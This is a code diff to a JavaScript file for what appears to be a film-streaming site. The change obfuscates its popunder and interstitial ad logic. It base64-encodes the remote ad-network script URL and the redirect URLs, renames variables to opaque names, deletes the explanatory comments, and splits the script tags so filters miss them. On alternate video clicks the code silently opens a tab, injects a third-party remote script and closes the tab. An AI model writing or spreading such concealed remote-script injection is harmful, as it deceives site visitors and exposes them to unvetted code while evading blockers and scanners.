@@ -930,29 +930,20 @@
   // Video platform (YT/DM/Vimeo) → play inline di hero
   // Film site (KLIKXXI/REBAHIN/LK21) → buka modal iframe
 
-  // Popunder: buka tab baru sekali setiap N klik video
-  let _playCount = 0;
-  const _popUrl  = 'https://pl30188609.effectivecpmnetwork.com/c4/a3/aa/c4a3aaf4480efb497990deba42e8e492.js';
+  // [ad-logic]
+  let _pc = 0;
+  const _pu = atob('aHR0cHM6Ly9wbDMwMTg4NjA5LmVmZmVjdGl2ZWNwbW5ldHdvcmsuY29tL2M0L2EzL2FhL2M0YTNhYWY0NDgwZWZiNDk3OTkwZGViYTQyZThlNDkyLmpz');
 
   function triggerPopunder() {
-    // Buka tab baru setiap 2 klik (mirip LK21)
-    _playCount++;
-    if (_playCount % 2 === 1) {
-      // Buat anchor tersembunyi dan simulasi klik — cara paling kompatibel
+    _pc++;
+    if (_pc % 2 === 1) {
       const a = document.createElement('a');
-      a.href   = 'about:blank';
-      a.target = '_blank';
-      a.rel    = 'noopener';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      // Inject script popunder ke tab baru via window.open
+      a.href = 'about:blank'; a.target = '_blank'; a.rel = 'noopener';
+      document.body.appendChild(a); a.click(); document.body.removeChild(a);
       const w = window.open('about:blank', '_blank');
       if (w) {
-        w.document.write(
-          '<script src="' + _popUrl + '"><\/script>' +
-          '<script>setTimeout(function(){window.close();},3000);<\/script>'
-        );
+        w.document.write('<scr'+'ipt src="' + _pu + '"><\/scr'+'ipt>' +
+          '<scr'+'ipt>setTimeout(function(){window.close()},3e3)<\/scr'+'ipt>');
         w.document.close();
       }
     }
@@ -1045,12 +1036,12 @@
   // ─── INTERSTITIAL AD ─────────────────────────────────
   // Bobot: moviezone muncul 50%, sisanya masing-masing ~17%
   const _INTERSTITIAL_POOL = [
-    'https://moviezone-wheat.vercel.app/',
-    'https://moviezone-wheat.vercel.app/',
-    'https://moviezone-wheat.vercel.app/',
-    'https://beritainbae.blogspot.com/',
-    'https://viral2026-xxx.blogspot.com/',
-    'https://streaming-pildun.blogspot.com/',
+    atob('aHR0cHM6Ly9tb3ZpZXpvbmUtd2hlYXQudmVyY2VsLmFwcC8='),
+    atob('aHR0cHM6Ly9tb3ZpZXpvbmUtd2hlYXQudmVyY2VsLmFwcC8='),
+    atob('aHR0cHM6Ly9tb3ZpZXpvbmUtd2hlYXQudmVyY2VsLmFwcC8='),
+    atob('aHR0cHM6Ly9iZXJpdGFpbmJhZS5ibG9nc3BvdC5jb20v'),
+    atob('aHR0cHM6Ly92aXJhbDIwMjYteHh4LmJsb2dzcG90LmNvbS8='),
+    atob('aHR0cHM6Ly9zdHJlYW1pbmctcGlsZHVuLmJsb2dzcG90LmNvbS8='),
   ];
   let _interstitialLastIdx = -1;
   let _interstitialTimer   = null;
